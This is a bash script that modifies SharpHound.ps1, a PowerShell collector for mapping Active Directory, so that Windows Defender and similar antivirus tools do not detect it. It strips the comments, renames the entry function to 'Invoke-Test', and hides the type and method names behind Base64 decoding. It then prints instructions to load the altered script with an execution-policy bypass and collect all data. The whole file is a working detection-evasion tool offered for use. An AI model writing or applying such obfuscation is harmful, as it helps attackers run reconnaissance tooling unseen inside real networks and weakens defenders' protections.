#!/bin/bash

# Adjusting SharpHound.ps1 to get not detected by e.g. Windows Defender

#set -e 
#set -x

file=$1
new_file="SharpHound_new.ps1"

if [[ ! -f $1 ]]; then
    
    echo "File \"${file}\" not Found!"

else

    echo 
    echo "Adjusting the file..."
    echo 

    #Remove comment section

    sed '/<#/,/#>/d' $file > $new_file

    #Replace the string "Invoke-BloodHound"

    sed -i 's/Invoke-BloodHound/Invoke-Test/' $new_file

    #Insert Base64 represantations

    sed -i 's/$a = @()/$a = @()\n\t\$getType = \[System\.Text\.Encoding\]::ASCII\.GetString(\[System\.Convert\]::FromBase64String("U2hhcnBIb3VuZDMuU2hhcnBIb3VuZA=="))\n\t\$getMethod = \[System\.Text\.Encoding\]::ASCII\.GetString(\[System\.Convert\]::FromBase64String("SW52b2tlU2hhcnBIb3VuZA=="))/' $new_file
    sed -i 's/$Assembly\.GetType("SharpHound3\.SharpHound")\.GetMethod("InvokeSharpHound")\.Invoke($Null, @(,$passed))/$Assembly\.GetType($getType)\.GetMethod($getMethod)\.Invoke($Null, @(,$passed))/' $new_file

    echo "File adjusted..."
    echo

    #Instruction for using SharpHound

    echo "Now you can use SharpHound via the following steps:

        Powershell -exec bypass
        Import-module ./${new_file}
        Invoke-Test -CollectionMethod All"

fi
